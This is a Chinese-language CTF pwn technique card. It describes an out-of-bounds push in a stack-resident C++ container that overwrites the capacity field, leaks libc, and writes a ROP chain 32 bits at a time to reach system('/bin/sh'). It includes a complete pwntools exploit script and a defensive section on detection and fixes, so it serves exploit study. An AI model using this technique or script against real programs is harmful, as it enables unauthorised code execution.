---
id: binary-pwn-stack-cpp-stack-vector-capacity-overwrite-32bit-word-write-rop
title: C++ 栈上容器 push 超容量越界：edit 只用对象内「容量」字段做边界，覆写容量后获得 32 位粒度栈读写，泄 libc 后按槽写 ROP
type: scenario
domain: binary
path: binary/pwn/stack
technique: cpp-stack-container-push-oob-capacity-overwrite-32bit-slot-stack-rw-rop
aliases:
- StackVector
- 栈上 vector 越界
- push 超过容量泄露栈
- 覆写容量字段
- 32 位槽写栈
- 4 字节粒度 ROP
tags:
- pwn
- cpp
- stack
- container-oob
- capacity-overwrite
- out-of-bounds-read
- out-of-bounds-write
- libc-leak
- rop
- 32bit-word-write
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-08T00:04:10+08:00'
  notes: 已对照 content.md 与 img/02/04/06/08/10/11 核对：img/04 的 sub_185C(a1,a2) 为 if (a2>=*(QWORD*)(a1+24)) throw out_of_range，并 return 4*a2+a1，证明「数组首址=对象首址」、上界字段在 obj+24；img/02 六个 4 字节元素(末位 666)后第 7 次 push(值 999) 越界回读、打印出更高栈槽；img/06 的 __libc_start_call_main+128 与下标 18/19、img/08 libc_base 打印、img/10 的 ROP 链(ret/pop rdi//bin/sh/system)、img/11 的 cat flag 回显均与卡内一致，libc 偏移 0x29d90/0x29139/0x2a3e5 与原文脚本相同。已据截图修正卡内对象布局描述：原文可证的是「数组内联在对象首址 + obj+24 的 32 位上界」，而非 {void*data;capacity;count} 三字段紧跟数组；上界字段宽度与是否另有计数字段原文无反编译证据，已在卡内注明。未在本机复跑 PoC。
---

## 一句话结论

程序把 C++ 容器对象（`StackVector`，数组内联在对象首址、其后是计数/上界等字段）直接放在 `main` 的栈帧里，`push` 分支只把值按 4 字节槽向后落笔（`obj + 4 * 计数`）而完全不检查上界；连续 push 超过容量后，写入会越过数组落到对象自身的容量字段和其后的栈内容，于是先用一次「超容量 push」把容量字段改大，再用只按容量做边界检查的 `edit(idx)` 得到「对象基址 + 4*idx」的 32 位粒度读写原语：`show` 越界回读栈上 64 位的 libc 返回地址泄露 libc 基址，`edit` 按相邻两个 4 字节槽写入 ROP 链，退出时 ret2libc 执行 `system("/bin/sh")`。

## 原理

- **对象在栈上，数组内联在对象首址**：`StackVector` 不是堆上的 `std::vector`，而是整体放在 `main` 栈帧里的一块对象，数组元素直接内联在对象起始地址（`sub_185C` 的返回式 `4*idx + obj` 证明「对象首址就是数组首址」，没有单独的 `data` 指针字段）。原文「push 数组超过六个就会带出来后面的内存」与「上界字段位于 `obj + 24`」两处证据合起来给出布局：`6` 个 4 字节元素占满 `0..23`，紧随其后的 `obj + 24` 就是允许的最大元素个数（32 位）。因此「数组越界」直接等于「改写栈上的控制数据与返回地址区域」，不需要堆布局技巧。
- **push 无上界**：`push` 的语义是按 4 字节槽 `obj + 4 * 计数 = value` 落笔并递增计数，边界只靠调用方自觉；容量填满后继续 push 就会顺次写进 `obj + 24` 的上界字段和更高地址的栈槽。原文先 push 6 次填满，第 7 次 push 即出现「带出后面内存」的现象。
- **上界字段可被输入覆写**：边界检查函数（原文 `sub_185C`）形如 `if (idx >= *(QWORD *)(obj + 24)) throw std::out_of_range("Index out of range"); return 4*idx + obj;`，即 `idx` 是无符号 32 位、与 `obj + 24` 处的上界比较。该字段就在数组后面那片栈上，第 7 次 push 写入的值（PoC 用 `999`）会把它改成大值，之后所有 `0 <= idx < 新上界` 的下标都通过检查。注意「上界字段是 4 字节还是 8 字节」「是否另有独立计数字段」原文未给出反编译证据，只能按 `+24` 与 7 次 push 反推。
- **32 位粒度的读写**：`edit`/`show` 的元素宽度是 4 字节，所以原语是「按 4 字节字读写 `obj + 4*idx`」，相邻两个下标覆盖一个 64 位槽。原文通过调试确定栈上 `__libc_start_call_main+128` 的返回地址正好落在下标 18（低 32 位）与 19（高 32 位），于是 `show` 打印越界内容后按 `vector[19] << 32 | vector[18]` 拼回完整指针，再减去 libc 中该返回地址的固定偏移得到基址。
- **写 ROP 时只补低半 / 高半**：因为泄露值的高 32 位与 libc 内 gadget 的高 32 位相同，原文只 `edit(18, ret_low32)` 保住下标 19 的原有高半，再用 `edit(20/21) = pop rdi`、`edit(22/23) = "/bin/sh"`、`edit(24/25) = system` 依次写完整 64 位槽；这样每个槽只需写两次，且不用先知道/重建高 32 位。`exit` 走正常返回路径时，被改写的槽就是返回地址链，ret2libc 生效。
- **为什么必须 32 位拼 64 位**：`int` 下标一次只能写 4 字节，而栈上指针是 8 字节；把 «泄露的高半保留、只改低半» 与 «两槽成对写完整值» 两种做法混用，是这个原语下写 ROP 的关键约束。

## 触发条件

- 目标为 Linux x86-64、NX 开启的 C++ 程序，容器对象（含容量/计数）保存在栈帧内，且 `push`/`edit` 等操作的「数组」与对象字段、返回地址在同一栈区。
- `push` 不检查容量，或检查滞后（先写再自增/先自增再比较），使计数可以先越过容量。
- 存在按容量做边界检查的按索引读写接口（`edit`/`show`），且容量字段可被该越界写覆盖。
- 有可泄露的 libc 指针（如 `__libc_start_call_main` 的返回地址）落在越界可读的槽内；目标 libc 版本已知，能换算 `system`、`/bin/sh` 与 gadget 偏移。
- 无栈 canary（或 canary 落在不可达槽位，不阻挡返回），且容器操作的粒度与栈槽宽度对齐，便于逐槽改写。

## 利用步骤

1. 反编译 `main` 的菜单（`1. edit / 2. push / 3. pop / 4. print / 5. exit`）与 `push`/`edit`/`show` 实现，确认对象在栈帧内的偏移：数组首址 = 对象首址、`obj + 24` 处是 `edit` 边界比较所用的上界字段（`sub_185C` 的 `idx >= *(QWORD *)(obj + 24)`），并据「6 元素 + 第 7 次 push 越界」核对上界字段宽度。
2. 在 push 之后下断点（原文 `b *$rebase(0x146b)`），观察 `obj`、数组基址、`count`、容量字段与 `rsp`/`rbp`/返回地址的相对位移；确认「超容量 push 会写入容量字段本身」。
3. 先 push 若干次（原文 6 次填满容量）使其越界，通过第 7 次 push 把容量字段覆盖成大值，再用 `show` 打印全部槽，观察越界回读里是否出现 0x7f 开头的 libc 指针。
4. 用调试器确认哪个下标对应该返回地址：原文确认 libc_start_main 相关返回地址在下标 18（低）与 19（高），按 `addr = (vector[19] << 32) | (vector[18] & 0xffffffff)` 拼回，`libc_base = addr - 0x29d90`（该偏移随 libc 版本变化）。
5. 在 libc 中取 `ret`、`pop rdi; ret`、`system`、`/bin/sh` 偏移，按 «一槽两下标» 布置：下标 18 写 `ret` 低半（19 保留原高半），20/21 写 `pop rdi`，22/23 写 `/bin/sh` 指针，24/25 写 `system`。
6. 选择 `exit`(5) 结束菜单循环，主函数返回时执行 ROP；若需要栈对齐可插入额外 `ret` 槽，或调整链起始下标。
7. 拿到 shell 后 `cat flag`。

## PoC

原文脚本（按目标 libc 的偏移替换后可直接复现；未在本机复跑）：

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
libc = ELF('./libc.so.6')
p = process('./Vpwn')          # remote 版改 remote(host, port)

def choice(c):
    p.sendlineafter(b'choice: ', str(c))
def edit(idx, content=b'1'):
    choice(1); p.recvuntil(b'edit'); p.sendline(str(idx).encode())
    p.recvuntil(b'value'); p.sendline(str(content).encode())
def push():
    choice(2); p.recvuntil(b'push: '); p.sendline(b'999')
def show():
    choice(4)
def qu(value, part):                   # 取 64 位地址的低/高 32 位（按 int 语义）
    v = value & 0xFFFFFFFF if part == 0 else (value >> 32) & 0xFFFFFFFF
    return v - 2**32 if v > 0x7FFFFFFF else v

for _ in range(7):                     # push 越过容量，触发越界写并回读
    push()
show()
p.recvuntil(b'StackVector contents: ')
vec = p.recvuntil(b'\n').split(b' ')
libc_start_main = (int(vec[19]) << 32) + (int(vec[18]) & 0xffffffff)
libc_base = libc_start_main - 0x29d90
log.success('libc_base: ' + hex(libc_base))

ret, rdi = libc_base + 0x29139, libc_base + 0x2a3e5
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

edit(18, qu(ret, 0))                   # 19 的高半沿用泄露值
edit(20, qu(rdi, 0)); edit(21, qu(rdi, 1))
edit(22, qu(binsh_addr, 0)); edit(23, qu(binsh_addr, 1))
edit(24, qu(system_addr, 0)); edit(25, qu(system_addr, 1))
choice(5)                              # exit → 返回时走 ROP
p.interactive()
```

补充：若目标 libc 的 `system` 与泄露返回地址的高 32 位不同，需两槽都写；若 `pop rdi` 槽之后需要栈对齐，可在 18/19 写 `ret` 后再紧跟一个 `ret` 槽。

## 变体与关联

- 变体：容器换成 `std::vector<T>`，`push_back` 走 `_M_realloc_insert` 时会重新分配堆内存，越界写入就转移到堆上（需堆布局技巧），不再直接打栈；只有当容器「基址 + 容量 + 计数」都在栈上且不 realloc 时才等价。
- 变体：粒度是 1 字节（`char` 数组）时可以做逐字节写栈，精度更高；是 8 字节时则一次覆盖整槽，但需要先把高半谋算清楚。
- 变体：容量检查可绕过其他方式——计数是无符号时的下溢、`idx` 与容量字段類型不一致（`unsigned int` vs `size_t`）、边界检查先写后验等。
- 关联：[[ctf-pwn-vm-operand-stack-index-unbounded-push-canary-leak-orw-rop]]（push 无上界 + 越界回读栈顶泄露 + ROP）、[[binary-pwn-stack-sparse-word-write-struct-field-rewrite-ret2libc]]（写循环覆盖结构体控制字段后两阶段 ret2libc）、[[ctf-pwn-bill-array-index-loop-stack-word-write-ret2libc]]（32 位索引数组与索引变量重叠导致逐 32 位字写栈）、[[binary-pwn-heap-cpp-animal-edit-size-mismatch-environ-onegadget]]（C++ 容器编辑不校验长度）。
- 边界：若编译器把容量字段放到数组之前、或数组与对象分离（指针指向堆），本手法不成立；若无 libc 泄露点且 PIE 开启，需先找其他泄露；开启 canary 且 canary 槽在可写范围内时，改写返回地址前需先恢复 canary。

## 检测与防御

- 检测（逆向侧）：容器对象在栈帧内、`push` 只有「写基址 + 4*计数、计数++」而没有 `count < capacity` 判断、`edit/show` 的边界只读对象内容量字段，是一组强特征；另外「先自增再比较」「比较用无符号但索引来自有符号输入」也应视为缺陷。
- 检测（运行时）：同一会话里出现远超声明容量的 push 次数、随后大量按索引读取/写入、以及进程最终执行 `system` 或读取 flag 文件，可作为 CTF/沙箱环境告警特征。
- 修复：所有索引接口（push/pop/edit/show）在访问前做 `0 <= idx < capacity` 的双边界检查；容量字段不能被用户输入可达的越界写覆盖——把容器对象放到堆上并让边界字段与数据分离，或在栈上为对象加只读/隔离区；用 `std::vector::at()` 这类会抛异常的接口，并确保异常处理不可被绕过。
- 加固：PIE + Full RELRO + Canary + CET/Shadow Stack 提高利用门槛；对 C++ 菜单程序做 ASan/UBSan 与容器越界 fuzz。
